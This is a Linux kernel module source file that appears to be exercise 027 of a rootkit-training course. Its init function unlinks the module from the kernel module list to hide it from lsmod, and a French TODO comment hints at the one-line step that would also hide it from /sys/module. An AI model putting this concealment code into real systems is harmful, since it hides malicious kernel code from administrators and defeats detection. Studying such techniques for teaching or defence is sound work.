#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/list.h>
#include <linux/kobject.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("rootkitlings");
MODULE_DESCRIPTION("027: hide module from /sys/module");

static int __init hidesys_init(void)
{
    pr_info("rootkitlings/027: loading, hiding from lsmod and sysfs\n");

    /* Hide from lsmod (exercice 026) */
    list_del(&THIS_MODULE->list);

    // TODO(rootkitlings): retire le module de sysfs.
    //                     Le kobject est dans THIS_MODULE->mkobj.kobj.
    //                     1 ligne de code.

    pr_info("rootkitlings/027: hidden from lsmod AND /sys/module\n");
    return 0;
}

static void __exit hidesys_exit(void)
{
    pr_info("rootkitlings/027: unloading\n");
}

module_init(hidesys_init);
module_exit(hidesys_exit);
